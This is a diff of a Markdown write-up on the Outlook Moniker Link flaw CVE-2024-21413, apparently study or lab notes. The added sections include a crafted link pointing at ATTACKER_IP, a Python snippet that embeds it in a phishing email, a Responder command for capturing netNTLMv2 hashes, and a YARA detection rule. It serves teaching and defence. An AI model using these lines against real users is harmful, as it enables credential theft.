@@ -1,89 +1,171 @@
 # 📧 CVE-2024-21413 - Microsoft Outlook Moniker Link Vulnerability
 
-On **February 13, 2024**, Microsoft disclosed a critical vulnerability in Microsoft Outlook, identified as **CVE-2024-21413**, discovered by **Haifei Li of Check Point Research**.
+## 🗓️ Disclosure
 
-The issue arises from the way Outlook handles **Moniker Links**, which are special types of hyperlinks tied to Microsoft’s **Component Object Model (COM)**. These links can bypass Outlook’s built-in security and be weaponized in phishing emails to trigger credential theft or **Remote Code Execution (RCE)**.
+- **Date**: February 13, 2024  
+- **CVE**: [CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413)  
+- **Discovered By**: Haifei Li (Check Point Research)
+
+## 🚨 Summary
+
+A critical vulnerability in Microsoft Outlook allows attackers to exploit **Moniker Links**, leading to **NTLM credential leakage** and potentially **Remote Code Execution (RCE)**. This bypasses Outlook’s Protected View and security prompts.
 
 ---
 
 ## 🔍 What is a Moniker Link?
 
-Moniker links are not regular URLs. They are COM-based identifiers that can:
+Moniker Links are not traditional URLs like `http://`. They use Microsoft’s **Component Object Model (COM)** and can:
 
-- Access local files or network shares
+- Access local files or remote network shares
 - Bind to and execute COM objects
-- Trigger unintended system behaviors when clicked
+- Trigger high-privilege actions
 
-### Why It Matters
+Outlook fails to properly handle these links, which can result in:
 
-Outlook mishandles these links, allowing attackers to:
-
-- Leak NTLM credentials to an external attacker-controlled server
-- Potentially execute arbitrary code on the victim’s system
+- Automatic NTLM authentication to attacker-controlled SMB servers
+- Leakage of Windows **netNTLMv2** hashes
+- Potential RCE using COM-based payloads
 
 ---
 
 ## 📊 Vulnerability Overview
 
-| **Field**        | **Detail**                                                                 |
-|------------------|-----------------------------------------------------------------------------|
-| **CVE**          | [CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413) |
-| **Publish Date** | February 13, 2024                                                           |
-| **Impact**       | Remote Code Execution (RCE), Credential Leak                                |
-| **Severity**     | Critical                                                                    |
-| **Attack Complexity** | Low                                                                  |
-| **CVSS Score**   | 9.8                                                                         |
-| **Discovered By**| Haifei Li, Check Point Research                                             |
+| Field                  | Detail                                                              |
+|------------------------|---------------------------------------------------------------------|
+| CVE                    | [CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413) |
+| Impact                 | Remote Code Execution, Credential Theft                            |
+| Severity               | Critical (CVSS 9.8)                                                 |
+| Attack Complexity      | Low                                                                 |
+| Discovered By          | Haifei Li, Check Point Research                                     |
 
 ---
 
 ## 🖥️ Affected Software Versions
 
-| **Office Release**                | **Affected Version(s)**                          |
-|----------------------------------|--------------------------------------------------|
-| Microsoft Office LTSC 2021       | From 19.0.0                                      |
-| Microsoft 365 Apps for Enterprise| From 16.0.1                                      |
-| Microsoft Office 2019            | From 16.0.1                                      |
-| Microsoft Office 2016            | 16.0.0 before 16.0.5435.1001                     |
+| Microsoft Office Version         | Affected From Version              |
+|----------------------------------|------------------------------------|
+| Microsoft Office LTSC 2021       | 19.0.0                             |
+| Microsoft 365 Apps for Enterprise| 16.0.1                             |
+| Microsoft Office 2019            | 16.0.1                             |
+| Microsoft Office 2016            | < 16.0.5435.1001                   |
 
 ---
 
-## 🧠 Technical Context: What Is COM?
+## ⚙️ Technical Context
 
-Microsoft’s **Component Object Model (COM)** is a technology used for inter-process communication and object creation in Windows.
+### COM & Moniker Links
 
-A **Moniker** in COM is:
+- COM: Microsoft's Component Object Model used for object interaction.
+- Monikers: COM-based “intelligent names” that bind to objects or files.
+- `file://` links in HTML emails can invoke these Monikers.
 
-- A type of “intelligent name” that identifies and binds to COM objects
-- Capable of linking to local resources, network shares, or system components
+### Bypass Technique
 
-When misused in links (e.g., in emails), these **Moniker Links** can instruct the system to perform high-privilege actions, leading to major security concerns.
+- A Moniker Link like:
 
----
+  ```html
+  <a href="file://ATTACKER_IP/test!exploit">Click me</a>
+  ```
 
-## 🛡️ Exploitation Risk
-
-Attackers exploit this by:
-
-1. Sending a crafted email with a **malicious Moniker Link**
-2. Victim clicks the link → triggers:
-   - **NTLM credential theft**
-   - **Remote Code Execution (RCE)**
-
-These links bypass Outlook's default security warnings — making them especially dangerous.
+  uses a special character (`!`) to bypass Protected View, forcing Outlook to initiate an SMB connection to the attacker’s server—sending NTLM hashes.
 
 ---
 
-## 📝 Summary
+## 🧪 Proof-of-Concept (PoC)
 
-- **CVE-2024-21413** demonstrates the dangers of legacy tech (COM/Moniker) being used in modern apps
-- Users should update Outlook immediately and apply Microsoft’s patches
-- Be cautious of suspicious emails, especially those containing strange or non-http/https links
+### Email Exploit Script
+
+A Python PoC sends an HTML email with a crafted Moniker Link:
+
+```python
+html_content = '''
+<!DOCTYPE html>
+<html lang="en">
+    <p><a href="file://ATTACKER_IP/test!exploit">Click me</a></p>
+</html>
+'''
+```
+
+### Responder SMB Listener
+
+```bash
+responder -I ens5
+```
+
+### Outcome
+
+- Victim opens Outlook
+- Clicks the "Click me" link
+- Responder captures the **netNTLMv2** hash from the SMB authentication attempt
 
 ---
 
-> 💡 Pro Tip: Disable automatic NTLM authentication to mitigate credential leakage risks from these types of exploits.
->
+## 🔎 Detection
+
+### 🧪 YARA Rule (by Florian Roth)
+
+```yara
+rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {
+    meta:
+        description = "Detects CVE-2024-21413 exploitation attempts"
+        author = "X__Junior, Florian Roth"
+        reference = "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/"
+        date = "2024-02-17"
+        modified = "2024-02-19"
+        score = 75
+
+    strings:
+        $a1 = "Subject: "
+        $a2 = "Received: "
+        $xr1 = /file:\/\/\/\\[^"']{6,600}\.(docx|txt|pdf|...)!/
+
+    condition:
+        filesize < 1000KB
+        and all of ($a*)
+        and 1 of ($xr*)
+}
+```
+
+### Wireshark
+
+- SMB request and **netNTLMv2 hash** can be captured in packet traces.
+
+---
+
+## 🛡️ Mitigation & Remediation
+
+- ✅ **Update Microsoft Outlook** immediately via Windows Update or Microsoft Update Catalog
+- 🚫 **No configuration workaround** exists to disable Moniker handling in Outlook
+- 🔐 Consider disabling automatic NTLM authentication where feasible
+- 🔥 Blocking outbound SMB (port 445) on firewalls can help mitigate credential theft
+
+---
+
+## 🔐 Security Best Practices
+
+- Do **not click** unknown or suspicious links
+- **Preview** links before clicking
+- **Forward** suspicious emails to your IT or cybersecurity team
+- Monitor systems for signs of unusual SMB or NTLM traffic
+
+---
+
+## 🧾 Key Terms
+
+| Term        | Definition                                       |
+|-------------|--------------------------------------------------|
+| **COM**     | Component Object Model — Windows object system   |
+| **Moniker** | A COM-based reference to link or bind to objects |
+| **NTLM**    | Windows authentication protocol                  |
+| **RCE**     | Remote Code Execution                            |
+
+---
+
+## 🧠 Trivia & Questions
+
+- 🔧 **Tool used to capture hashes**: `responder`
+- 🔑 **Hash type captured**: `netNTLMv2`
+
 > ---
 
 <sub>🔗 References & Resources:</sub>
